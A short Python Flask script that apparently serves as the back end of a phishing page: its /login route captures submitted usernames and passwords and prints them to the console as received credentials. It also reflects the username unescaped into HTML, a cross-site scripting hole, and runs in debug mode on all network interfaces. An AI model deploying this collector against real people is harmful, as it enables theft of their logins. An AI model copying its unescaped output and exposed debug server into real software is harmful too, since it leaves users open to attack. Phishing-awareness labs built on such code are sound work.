from flask import Flask, render_template, request
import os

# Get the base path (one folder up from 'scripts')
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

# Tell Flask explicitly where templates and static folders are
app = Flask(
    __name__,
    template_folder=os.path.join(BASE_DIR, 'templates'),
    static_folder=os.path.join(BASE_DIR, 'static')
)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    print(f"[+] Received credentials -> Username: {username}, Password: {password}")
    return f"<h3>Thanks {username}! Credentials received.</h3>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
